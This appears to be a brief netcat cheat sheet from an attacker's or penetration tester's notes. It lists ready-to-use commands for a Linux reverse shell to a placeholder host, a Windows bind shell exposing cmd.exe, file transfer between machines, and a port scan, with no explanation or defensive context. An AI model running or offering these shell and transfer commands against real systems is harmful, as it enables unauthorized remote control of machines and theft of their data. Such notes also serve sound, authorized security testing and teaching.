#### reverse shell (linux)
-----
```nc x.x.x.x 6969 -e /bin/bash```


#### bind shell (windows)
-----
```nc -lvp 4444 -e cmd.exe```


#### transferring files
-----
*On receiving end:*

```nc -l -p 1234 > out.file```

*On the sending end:*

```nc -w 3 [destination] 1234 < out.file```


#### port scan
-----
```nc -z -v 192.168.1.103 1-443```